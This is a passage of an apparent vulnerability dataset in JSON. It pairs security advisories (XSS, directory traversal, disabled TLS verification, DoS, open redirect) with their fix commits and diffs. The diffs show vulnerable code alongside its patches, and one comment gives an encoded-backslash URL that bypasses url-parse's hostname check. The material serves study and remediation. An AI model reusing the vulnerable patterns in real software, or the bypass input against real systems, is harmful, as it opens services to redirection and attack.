'')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['flask_unchained\/bundles\/controller\/utils.py'])","num_files":1.0},{"index":2597,"vuln_id":"GHSA-pjpc-87mp-4332","cwe_id":"{'CWE-79'}","score":9.6,"chain":"{'https:\/\/github.com\/mautic\/mautic\/commit\/462eb596027fd949efbf9ac5cb2b376805e9d246'}","dataset":"osv","summary":"Cross-site Scripting vulnerability in Mautic's tracking pixel functionality ### Impact\n\nMautic allows you to track open rates by using tracking pixels. \nThe tracking information is stored together with extra metadata of the tracking request.\n\nThe output isn't sufficiently filtered when showing the metadata of the tracking information, which may lead to a vulnerable situation.\n\n### Patches\n\nPlease upgrade to 4.3.0\n\n### Workarounds\nNone.\n\n### References\n* Internally tracked under MST-38\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@mautic.org](mailto:security@mautic.org)","published_date":"2022-05-25","chain_len":1,"project":"https:\/\/github.com\/mautic\/mautic","commit_href":"https:\/\/github.com\/mautic\/mautic\/commit\/462eb596027fd949efbf9ac5cb2b376805e9d246","commit_sha":"462eb596027fd949efbf9ac5cb2b376805e9d246","patch":"SINGLE","chain_ord":"['462eb596027fd949efbf9ac5cb2b376805e9d246']","before_first_fix_commit":"{'d1518c24e45515d710d4e488bc33a14027b64194'}","last_fix_commit":"462eb596027fd949efbf9ac5cb2b376805e9d246","chain_ord_pos":1.0,"commit_datetime":"05\/23\/2022, 11:55:13","message":"Merge pull request from GHSA-pjpc-87mp-4332\n\n* sanitise user agent before displaying\n\n* Update app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php\n\nCo-authored-by: John Linhart <admin@escope.cz>\n\n* removed obsolete use statement\n\nCo-authored-by: John Linhart <admin@escope.cz>","author":"mollux","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mautic\/mautic\/raw\/462eb596027fd949efbf9ac5cb2b376805e9d246\/app%2Fbundles%2FEmailBundle%2FViews%2FSubscribedEvents%2FTimeline%2Findex.html.php', 'patch': \"@@ -8,6 +8,7 @@\\n  *\\n  * @license     GNU\/GPLv3 http:\/\/www.gnu.org\/licenses\/gpl-3.0.html\\n  *\/\\n+\\n if ($item = ((isset($event['extra'])) ? $event['extra']['stat'] : false)): ?>\\n     <p>\\n         <?php if (!empty($item['isFailed'])) : ?>\\n@@ -63,7 +64,7 @@\\n             endif;\\n             ?>\\n             <?php if ($counter > 1): ?><hr\/><?php endif; ?>\\n-            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $detail['useragent']; ?>\\n+            <strong><?php echo $view['date']->toText($detail['datetime'], 'UTC'); ?><\/strong><br\/><?php echo $view->escape($detail['useragent']); ?>\\n             <?php ++$counter; ?>\\n         <?php endforeach; ?>\\n         <?php\"}}","message_norm":"merge pull request from ghsa-pjpc-87mp-4332\n\n* sanitise user agent before displaying\n\n* update app\/bundles\/emailbundle\/views\/subscribedevents\/timeline\/index.html.php\n\nco-authored-by: john linhart <admin@escope.cz>\n\n* removed obsolete use statement\n\nco-authored-by: john linhart <admin@escope.cz>","language":"en","entities":"[('ghsa-pjpc-87mp-4332', 'VULNID', 'GHSA'), ('sanitise', 'SECWORD', ''), ('update', 'ACTION', ''), ('admin@escope.cz', 'SECWORD', ''), ('removed', 'ACTION', ''), ('admin@escope.cz', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/bundles\/EmailBundle\/Views\/SubscribedEvents\/Timeline\/index.html.php'])","num_files":1.0},{"index":2598,"vuln_id":"GHSA-pjxv-w3qj-j8m3","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/mguinness\/elFinder.AspNet\/commit\/675049b39284a9e84f0915c71d688da8ebc7d720'}","dataset":"osv","summary":"Directory Traversal in elFinder.AspNet This affects the package elFinder.AspNet before 1.1.1.\n The user-controlled file name is not properly sanitized before it is used to create a file system path.","published_date":"2021-08-09","chain_len":1,"project":"https:\/\/github.com\/mguinness\/elFinder.AspNet","commit_href":"https:\/\/github.com\/mguinness\/elFinder.AspNet\/commit\/675049b39284a9e84f0915c71d688da8ebc7d720","commit_sha":"675049b39284a9e84f0915c71d688da8ebc7d720","patch":"SINGLE","chain_ord":"['675049b39284a9e84f0915c71d688da8ebc7d720']","before_first_fix_commit":"{'8f2690712bd6cf417d897d70f734d6e972cf0071'}","last_fix_commit":"675049b39284a9e84f0915c71d688da8ebc7d720","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2021, 01:28:34","message":"Directory traversal fixes","author":"mguinness","comments":null,"stats":"{'additions': 16, 'deletions': 0, 'total': 16}","files":"{'elFinder.AspNet\/Drivers\/FileSystem\/FileSystemDriver.cs': {'additions': 16, 'deletions': 0, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mguinness\/elFinder.AspNet\/raw\/675049b39284a9e84f0915c71d688da8ebc7d720\/elFinder.AspNet%2FDrivers%2FFileSystem%2FFileSystemDriver.cs', 'patch': '@@ -229,6 +229,12 @@ public async Task<ConnectorResult> ExtractAsync(FullPath fullPath, bool newFolde\\n                         string file = Path.Combine(rootPath, entry.FullName)\\n                              .Replace(\"\/\", separator).Replace(\"\\\\\\\\\", separator);\\n \\n+                        string destPath = Path.GetFullPath(file);\\n+                        if (!destPath.StartsWith(rootPath, StringComparison.OrdinalIgnoreCase))\\n+                        {\\n+                            throw new NotSupportedException($\"Entry \\'{entry.FullName}\\' is outside of the destination directory.\");\\n+                        }\\n+\\n                         if (file.EndsWith(separator)) \/\/directory\\n                         {\\n                             var dir = new FileSystemDirectory(file);\\n@@ -636,12 +642,22 @@ public async Task<ConnectorResult> RenameAsync(FullPath path, string name)\\n             if (path.IsDirectory)\\n             {\\n                 var newPath = new FileSystemDirectory(Path.Combine(path.Directory.Parent.FullName, name));\\n+                string destPath = Path.GetFullPath(newPath.FullName);\\n+                if (!destPath.StartsWith(path.RootVolume.RootDirectory, StringComparison.OrdinalIgnoreCase))\\n+                {\\n+                    throw new NotSupportedException($\"Entry \\'{name}\\' is outside of the home directory.\");\\n+                }\\n                 Directory.Move(path.Directory.FullName, newPath.FullName);\\n                 response.Added.Add(await BaseModel.CreateAsync(newPath, path.RootVolume));\\n             }\\n             else\\n             {\\n                 var newPath = new FileSystemFile(Path.Combine(path.File.DirectoryName, name));\\n+                string destPath = Path.GetFullPath(newPath.FullName);\\n+                if (!destPath.StartsWith(path.RootVolume.RootDirectory, StringComparison.OrdinalIgnoreCase))\\n+                {\\n+                    throw new NotSupportedException($\"Entry \\'{name}\\' is outside of the home directory.\");\\n+                }\\n                 File.Move(path.File.FullName, newPath.FullName);\\n                 response.Added.Add(await BaseModel.CreateAsync(newPath, path.RootVolume));\\n             }'}}","message_norm":"directory traversal fixes","language":"ca","entities":"[('directory traversal', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['elFinder.AspNet\/Drivers\/FileSystem\/FileSystemDriver.cs'])","num_files":1.0},{"index":2602,"vuln_id":"GHSA-pm77-c4q7-3fwj","cwe_id":"{'CWE-295'}","score":5.9,"chain":"{'https:\/\/github.com\/globalpayments\/php-sdk\/pull\/8\/commits\/c86e18f28c5eba0d6ede7d557756d978ea83d3c9'}","dataset":"osv","summary":"Improper Certificate Validation in Heartland & Global Payments PHP SDK Gateways\/Gateway.php in Heartland & Global Payments PHP SDK before 2.0.0 does not enforce SSL certificate validations.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/globalpayments\/php-sdk","commit_href":"https:\/\/github.com\/globalpayments\/php-sdk\/pull\/8\/commits\/c86e18f28c5eba0d6ede7d557756d978ea83d3c9","commit_sha":"c86e18f28c5eba0d6ede7d557756d978ea83d3c9","patch":"SINGLE","chain_ord":"['c86e18f28c5eba0d6ede7d557756d978ea83d3c9']","before_first_fix_commit":"{'b860aca9b7ed1aeb5a13b5ef52120f5d15efd2f7'}","last_fix_commit":"c86e18f28c5eba0d6ede7d557756d978ea83d3c9","chain_ord_pos":1.0,"commit_datetime":"03\/26\/2019, 23:32:57","message":"Remove unsecure CURLOPT_SSL_VERIFY* options\n\nVerification of peer certificate against trusted CAs and hostname verification should never be turned off otherwise MITM attacks are possible.","author":"oldpec","comments":null,"stats":"{'additions': 0, 'deletions': 2, 'total': 2}","files":"{'src\/Gateways\/Gateway.php': {'additions': 0, 'deletions': 2, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/globalpayments\/php-sdk\/raw\/c86e18f28c5eba0d6ede7d557756d978ea83d3c9\/src%2FGateways%2FGateway.php', 'patch': '@@ -77,8 +77,6 @@ protected function sendRequest(\\n             curl_setopt($request, CURLOPT_CONNECTTIMEOUT, $this->timeout);\\n             curl_setopt($request, CURLOPT_TIMEOUT, $this->timeout);\\n             curl_setopt($request, CURLOPT_RETURNTRANSFER, true);\\n-            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, false); \/\/true,);\\n-            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, false); \/\/2,);\\n             curl_setopt($request, CURLOPT_CUSTOMREQUEST, strtoupper($verb));\\n             curl_setopt($request, CURLOPT_POSTFIELDS, $data);\\n             curl_setopt($request, CURLOPT_HTTPHEADER, $headers);'}}","message_norm":"remove unsecure curlopt_ssl_verify* options\n\nverification of peer certificate against trusted cas and hostname verification should never be turned off otherwise mitm attacks are possible.","language":"en","entities":"[('remove', 'ACTION', ''), ('unsecure', 'SECWORD', ''), ('certificate', 'SECWORD', ''), ('hostname', 'SECWORD', ''), ('mitm', 'SECWORD', ''), ('attacks', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Gateways\/Gateway.php'])","num_files":1.0},{"index":2603,"vuln_id":"GHSA-pm9p-9926-w68m","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/71ce93988ead4b561a8592168c72143907189f01'}","dataset":"osv","summary":"Denial of Service in ecstatic `ecstatic`, a simple static file server middleware, is vulnerable to denial of service. If a payload with a large number of null bytes (`%00`) is provided by an attacker it can crash ecstatic by running it out of memory.\n\n\n[Results from the original advisory](https:\/\/www.checkmarx.com\/advisories\/denial-of-service-dos-vulnerability-in-ecstatic-npm-package\/)\n\n```\nA payload of 22kB caused a lag of 1 second,\nA payload of 35kB caused a lag of 3 seconds,\nA payload of 86kB caused the server to crash\n```\n\n\n## Recommendation\n\nUpdate to version 2.0.0 or later.","published_date":"2017-12-28","chain_len":1,"project":"https:\/\/github.com\/jfhbrook\/node-ecstatic","commit_href":"https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/71ce93988ead4b561a8592168c72143907189f01","commit_sha":"71ce93988ead4b561a8592168c72143907189f01","patch":"SINGLE","chain_ord":"['71ce93988ead4b561a8592168c72143907189f01']","before_first_fix_commit":"{'2fceb40fb9eeaaba29f5d2c3b63583fefb04a130'}","last_fix_commit":"71ce93988ead4b561a8592168c72143907189f01","chain_ord_pos":1.0,"commit_datetime":"08\/09\/2016, 16:37:39","message":"Remove stripping of null bytes\n\nThis was at one point necessary because of an old bug in url.parse\n\nSee: https:\/\/github.com\/jfhbrook\/node-ecstatic\/issues\/16#issuecomment-3039914\nSee: https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/43f7e72a31524f88f47e367c3cc3af710e67c9f4\n\nBut this opens up a regex dos attack vector! D:\n\nBased on some research (ie asking #node-dev if this is still an issue),\nit's *probably* not an issue. :)","author":"Joshua Holbrook","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'lib\/ecstatic.js': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jfhbrook\/node-ecstatic\/raw\/71ce93988ead4b561a8592168c72143907189f01\/lib%2Fecstatic.js', 'patch': \"@@ -52,9 +52,21 @@ var ecstatic = module.exports = function (dir, options) {\\n   return function middleware (req, res, next) {\\n \\n     \/\/ Strip any null bytes from the url\\n+    \/\/ This was at one point necessary because of an old bug in url.parse\\n+    \/\/\\n+    \/\/ See: https:\/\/github.com\/jfhbrook\/node-ecstatic\/issues\/16#issuecomment-3039914\\n+    \/\/ See: https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/43f7e72a31524f88f47e367c3cc3af710e67c9f4\\n+    \/\/\\n+    \/\/ But this opens up a regex dos attack vector! D:\\n+    \/\/\\n+    \/\/ Based on some research (ie asking #node-dev if this is still an issue),\\n+    \/\/ it's *probably* not an issue. :)\\n+    \/*\\n     while(req.url.indexOf('%00') !== -1) {\\n       req.url = req.url.replace(\/\\\\%00\/g, '');\\n     }\\n+    *\/\\n+\\n     \/\/ Figure out the path for the file from the given url\\n     var parsed = url.parse(req.url);\\n     try {\"}}","message_norm":"remove stripping of null bytes\n\nthis was at one point necessary because of an old bug in url.parse\n\nsee: https:\/\/github.com\/jfhbrook\/node-ecstatic\/issues\/16#issuecomment-3039914\nsee: https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/43f7e72a31524f88f47e367c3cc3af710e67c9f4\n\nbut this opens up a regex dos attack vector! d:\n\nbased on some research (ie asking #node-dev if this is still an issue),\nit's *probably* not an issue. :)","language":"en","entities":"[('remove', 'ACTION', ''), ('bug', 'FLAW', ''), ('https:\/\/github.com\/jfhbrook\/node-ecstatic\/issues\/16#issuecomment-3039914', 'FLAW', ''), ('https:\/\/github.com\/jfhbrook\/node-ecstatic\/commit\/43f7e72a31524f88f47e367c3cc3af710e67c9f4', 'SHA', 'github_url_sha'), ('dos', 'SECWORD', ''), ('attack vector', 'SECWORD', ''), ('issue', 'FLAW', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/ecstatic.js'])","num_files":1.0},{"index":2605,"vuln_id":"GHSA-pmpr-55fj-r229","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6841e522a3e7d48706a02e8819836e809f738682'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `SVDF` ### Impact\nThe implementation of the `SVDF` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/7f283ff806b2031f407db64c4d3edcda8fb9f9f5\/tensorflow\/lite\/kernels\/svdf.cc#L99-L102):\n\n```cc\nconst int rank = params->rank;\n...\nTF_LITE_ENSURE_EQ(context, num_filters % rank, 0);\n```\n\nAn attacker can craft a model such that `params->rank` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6841e522a3e7d48706a02e8819836e809f738682](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6841e522a3e7d48706a02e8819836e809f738682).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6841e522a3e7d48706a02e8819836e809f738682","commit_sha":"6841e522a3e7d48706a02e8819836e809f738682","patch":"SINGLE","chain_ord":"['6841e522a3e7d48706a02e8819836e809f738682']","before_first_fix_commit":"{'7f283ff806b2031f407db64c4d3edcda8fb9f9f5'}","last_fix_commit":"6841e522a3e7d48706a02e8819836e809f738682","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 22:13:03","message":"Prevent division by 0\n\nPiperOrigin-RevId: 370995582\nChange-Id: I670ffaf52d1ff8823ec31ea5f438f9125b402223","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/svdf.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6841e522a3e7d48706a02e8819836e809f738682\/tensorflow%2Flite%2Fkernels%2Fsvdf.cc', 'patch': '@@ -99,6 +99,7 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n   const int rank = params->rank;\\n   const int batch_size = input->dims->data[0];\\n   const int num_filters = weights_feature->dims->data[0];\\n+  TF_LITE_ENSURE(context, rank != 0);\\n   TF_LITE_ENSURE_EQ(context, num_filters % rank, 0);\\n   const int num_units = num_filters \/ rank;\\n   const int memory_size = weights_time->dims->data[1];'}}","message_norm":"prevent division by 0\n\npiperorigin-revid: 370995582\nchange-id: i670ffaf52d1ff8823ec31ea5f438f9125b402223","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370995582', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/svdf.cc'])","num_files":1.0},{"index":2613,"vuln_id":"GHSA-ppc3-fpvh-7396","cwe_id":"{'CWE-362'}","score":7.0,"chain":"{'https:\/\/github.com\/apache\/netbeans-html4j\/commit\/fa70e507e5555e1adb4f6518479fc408a7abd0e6'}","dataset":"osv","summary":"Improper synchronization in Apache Netbeans HTML\/Java API There exists a race condition between the deletion of the temporary file and the creation of the temporary directory in `webkit` subproject of HTML\/Java API version 1.7. A similar vulnerability has recently been disclosed in other Java projects and the fix in HTML\/Java API version 1.7.1 follows theirs: To avoid local privilege escalation version 1.7.1 creates the temporary directory atomically without dealing with the temporary file.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/apache\/netbeans-html4j","commit_href":"https:\/\/github.com\/apache\/netbeans-html4j\/commit\/fa70e507e5555e1adb4f6518479fc408a7abd0e6","commit_sha":"fa70e507e5555e1adb4f6518479fc408a7abd0e6","patch":"SINGLE","chain_ord":"['fa70e507e5555e1adb4f6518479fc408a7abd0e6']","before_first_fix_commit":"{'d1dcd9c0542ac46d7764256a81057dfbe2d8805a'}","last_fix_commit":"fa70e507e5555e1adb4f6518479fc408a7abd0e6","chain_ord_pos":1.0,"commit_datetime":"12\/15\/2020, 08:56:27","message":"createTempDirectory atomically","author":"Jaroslav Tulach","comments":null,"stats":"{'additions': 1, 'deletions': 3, 'total': 4}","files":"{'webkit\/src\/main\/java\/org\/netbeans\/html\/presenters\/webkit\/UnJarResources.java': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/netbeans-html4j\/raw\/fa70e507e5555e1adb4f6518479fc408a7abd0e6\/webkit%2Fsrc%2Fmain%2Fjava%2Forg%2Fnetbeans%2Fhtml%2Fpresenters%2Fwebkit%2FUnJarResources.java', 'patch': '@@ -39,9 +39,7 @@ static URL extract(URL url) throws IOException {\\n         if (jar == null) {\\n             return url;\\n         }\\n-        File dir = File.createTempFile(jar.getName(), \".dir\");\\n-        dir.delete();\\n-        dir.mkdirs();\\n+        File dir = Files.createTempDirectory(jar.getName() + \".dir\").toFile();\\n \\n         Enumeration<JarEntry> en = jar.entries();\\n         while (en.hasMoreElements()) {'}}","message_norm":"createtempdirectory atomically","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['webkit\/src\/main\/java\/org\/netbeans\/html\/presenters\/webkit\/UnJarResources.java'])","num_files":1.0},{"index":2628,"vuln_id":"GHSA-pqrv-8r2f-7278","cwe_id":"{'CWE-754'}","score":5.9,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/955059813cc325dc1db5e2daa6221271406d4439'}","dataset":"osv","summary":"Crash due to erroneous `StatusOr` in TensorFlow ### Impact\nA `GraphDef` from a TensorFlow `SavedModel` can be maliciously altered to cause a TensorFlow process to crash due to encountering [a `StatusOr` value that is an error and forcibly extracting the value from it](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/274df9b02330b790aa8de1cee164b70f72b9b244\/tensorflow\/core\/graph\/graph.cc#L560-L567):\n\n```cc\n  if (op_reg_data->type_ctor != nullptr) {\n    VLOG(3) << \"AddNode: found type constructor for \" << node_def.name();\n    const auto ctor_type =\n        full_type::SpecializeType(AttrSlice(node_def), op_reg_data->op_def);\n    const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();\n    if (ctor_typedef.type_id() != TFT_UNSET) {\n      *(node_def.mutable_experimental_type()) = ctor_typedef;\n    }\n  }\n```   \n      \nIf `ctor_type` is an error status, `ValueOrDie` results in a crash.\n        \n### Patches\nWe have patched the issue in GitHub commit [955059813cc325dc1db5e2daa6221271406d4439](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/955059813cc325dc1db5e2daa6221271406d4439).\n  \nWe have patched the issue in multiple GitHub commits and these will be included in TensorFlow 2.8.0 and TensorFlow 2.7.1, as both are affected.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/955059813cc325dc1db5e2daa6221271406d4439","commit_sha":"955059813cc325dc1db5e2daa6221271406d4439","patch":"SINGLE","chain_ord":"['955059813cc325dc1db5e2daa6221271406d4439']","before_first_fix_commit":"{'3d89911481ba6ebe8c88c1c0b595412121e6c645'}","last_fix_commit":"955059813cc325dc1db5e2daa6221271406d4439","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 16:17:57","message":"Check for type inference error on node construction.\n\nPiperOrigin-RevId: 409415804\nChange-Id: Ieb6e020906b96f522bf8e2fa103715ddbbdc434a","author":"Dan Moldovan","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/graph\/graph.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/955059813cc325dc1db5e2daa6221271406d4439\/tensorflow%2Fcore%2Fgraph%2Fgraph.cc', 'patch': '@@ -561,6 +561,11 @@ Node* Graph::AddNode(NodeDef node_def, Status* status) {\\n     VLOG(3) << \"AddNode: found type constructor for \" << node_def.name();\\n     const auto ctor_type =\\n         full_type::SpecializeType(AttrSlice(node_def), op_reg_data->op_def);\\n+    if (!ctor_type.ok()) {\\n+      *status = errors::InvalidArgument(\"type error: \",\\n+                                        ctor_type.status().ToString());\\n+      return nullptr;\\n+    }\\n     const FullTypeDef ctor_typedef = ctor_type.ValueOrDie();\\n     if (ctor_typedef.type_id() != TFT_UNSET) {\\n       *(node_def.mutable_experimental_type()) = ctor_typedef;'}}","message_norm":"check for type inference error on node construction.\n\npiperorigin-revid: 409415804\nchange-id: ieb6e020906b96f522bf8e2fa103715ddbbdc434a","language":"en","entities":"[('error', 'FLAW', ''), ('409415804', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/graph\/graph.cc'])","num_files":1.0},{"index":2630,"vuln_id":"GHSA-pr38-qpxm-g88x","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/apache\/activemq-artemis\/pull\/3871\/commits\/153d2e9a979aead8dff95fbc91d659ecc7d0fb82', 'https:\/\/github.com\/apache\/activemq-artemis\/pull\/3862\/commits\/1f92368240229b8f5db92a92a72c703faf83e9b7'}","dataset":"osv","summary":"Uncontrolled Resource Consumption in Apache ActiveMQ Artemis In Apache ActiveMQ Artemis prior to 2.20.0 or 2.19.1, an attacker could partially disrupt availability (DoS) through uncontrolled resource consumption of memory.","published_date":"2022-02-06","chain_len":2,"project":"https:\/\/github.com\/apache\/activemq-artemis","commit_href":"https:\/\/github.com\/apache\/activemq-artemis\/pull\/3862\/commits\/1f92368240229b8f5db92a92a72c703faf83e9b7","commit_sha":"1f92368240229b8f5db92a92a72c703faf83e9b7","patch":"MULTI","chain_ord":"['1f92368240229b8f5db92a92a72c703faf83e9b7', '153d2e9a979aead8dff95fbc91d659ecc7d0fb82']","before_first_fix_commit":"{'4196faf7ce56cb3676d46acb3b0684b5cdf804d7'}","last_fix_commit":"153d2e9a979aead8dff95fbc91d659ecc7d0fb82","chain_ord_pos":1.0,"commit_datetime":"11\/19\/2021, 12:02:45","message":"Be defensive when reading data from `ActiveMQBuffer` and allocating memory.\n\nOr else, an adversary may handcraft the packet causing OOM situation for a running a JVM.","author":"Viktor Kolomeyko","comments":null,"stats":"{'additions': 16, 'deletions': 4, 'total': 20}","files":"{'artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java': {'additions': 16, 'deletions': 4, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/activemq-artemis\/raw\/1f92368240229b8f5db92a92a72c703faf83e9b7\/artemis-core-client%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Factivemq%2Fartemis%2Futils%2FXidCodecSupport.java', 'patch': '@@ -32,12 +32,24 @@ public static void encodeXid(final Xid xid, final ActiveMQBuffer out) {\\n       out.writeBytes(xid.getGlobalTransactionId());\\n    }\\n \\n+   private static byte[] safeReadBytes(final ActiveMQBuffer in) {\\n+      int claimedSize = in.readInt();\\n+      int bufferCapacity = in.capacity();\\n+      \/\/ We have to be defensive here and not try to allocate byte buffer straight from information available in the\\n+      \/\/ stream. Or else, an adversary may handcraft the packet causing OOM situation for a running JVM.\\n+      if (claimedSize > bufferCapacity) {\\n+         throw new IllegalStateException(\"Buffer size: \" + claimedSize +\\n+                 \" exceeds overall buffer size of: \" + bufferCapacity);\\n+      }\\n+      byte[] byteBuffer = new byte[claimedSize];\\n+      in.readBytes(byteBuffer);\\n+      return byteBuffer;\\n+   }\\n+\\n    public static Xid decodeXid(final ActiveMQBuffer in) {\\n       int formatID = in.readInt();\\n-      byte[] bq = new byte[in.readInt()];\\n-      in.readBytes(bq);\\n-      byte[] gtxid = new byte[in.readInt()];\\n-      in.readBytes(gtxid);\\n+      byte[] bq = safeReadBytes(in);\\n+      byte[] gtxid = safeReadBytes(in);\\n       return new XidImpl(bq, formatID, gtxid);\\n    }'}}","message_norm":"be defensive when reading data from `activemqbuffer` and allocating memory.\n\nor else, an adversary may handcraft the packet causing oom situation for a running a jvm.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['artemis-core-client\/src\/main\/java\/org\/apache\/activemq\/artemis\/utils\/XidCodecSupport.java'])","num_files":1.0},{"index":2643,"vuln_id":"GHSA-pv4c-p2j5-38j4","cwe_id":"{'CWE-425'}","score":0.0,"chain":"{'https:\/\/github.com\/unshiftio\/url-parse\/commit\/d7b582ec1243e8024e60ac0b62d2569c939ef5de', 'https:\/\/github.com\/unshiftio\/url-parse\/commit\/53b1794e54d0711ceb52505e0f74145270570d5a'}","dataset":"osv","summary":"Open Redirect in url-parse Versions of `url-parse` before 1.4.3 returns the wrong hostname which could lead to Open Redirect, Server Side Request Forgery (SSRF), or Bypass Authentication Protocol vulnerabilities.\n\n\n## Recommendation\n\nUpdate to version 1.4.3 or later.","published_date":"2018-08-13","chain_len":2,"project":"https:\/\/github.com\/unshiftio\/url-parse","commit_href":"https:\/\/github.com\/unshiftio\/url-parse\/commit\/d7b582ec1243e8024e60ac0b62d2569c939ef5de","commit_sha":"d7b582ec1243e8024e60ac0b62d2569c939ef5de","patch":"MULTI","chain_ord":"['53b1794e54d0711ceb52505e0f74145270570d5a', 'd7b582ec1243e8024e60ac0b62d2569c939ef5de']","before_first_fix_commit":"{'53b1794e54d0711ceb52505e0f74145270570d5a'}","last_fix_commit":"d7b582ec1243e8024e60ac0b62d2569c939ef5de","chain_ord_pos":2.0,"commit_datetime":"07\/29\/2018, 12:42:38","message":"[security] Added missing SECURITY.md","author":"Arnout Kazemier","comments":"{'com_1': {'author': 'lpinca', 'datetime': '07\/29\/2018, 13:18:42', 'body': 'The open redirect vulnerability is not fixed.'}, 'com_2': {'author': '3rd-Eden', 'datetime': '07\/29\/2018, 18:01:14', 'body': \"Right, I just copy and pasted this from the reported issue. I can change it, and add a security section to the README and warn people to not bluntly accept user-input as valid URL's.\"}, 'com_3': {'author': 'lirantal', 'datetime': '07\/30\/2018, 08:19:29', 'body': \"@3rd-Eden that's really awesome that you're adding this!\\r\\nWe have a template over at the security-wg repo (https:\/\/github.com\/nodejs\/security-wg\/blob\/master\/processes\/responsible_disclosure_template.md) that I'd be happy to work with you on to improve with references to what you've also added here. \\r\\n\\r\\nYou may also add a security badge to raise awareness:\\r\\n[![Security Responsible Disclosure](https:\/\/img.shields.io\/badge\/Security-Responsible%20Disclosure-yellow.svg)](https:\/\/github.com\/nodejs\/security-wg\/blob\/master\/processes\/responsible_disclosure_template.md\\r\\n)\"}, 'com_4': {'author': 'SegfaultMasters', 'datetime': '09\/03\/2018, 06:26:18', 'body': 'Though it replaced double slash, one can still perform open-redirect using encoded format \"%5c%5c\"\\r\\nHere\\'s the testcase \\r\\n```\\r\\n\\'use strict\\';\\r\\nvar URL = require(\\'url-parse\\');\\r\\nvar url = new URL(\\'http:\/\/google.com:80%5c%5cyahoo.com\/\/#what\\\\\\\\is going on\\');\\r\\nconsole.log(url.hostname);\\r\\n```'}, 'com_5': {'author': 'lirantal', 'datetime': 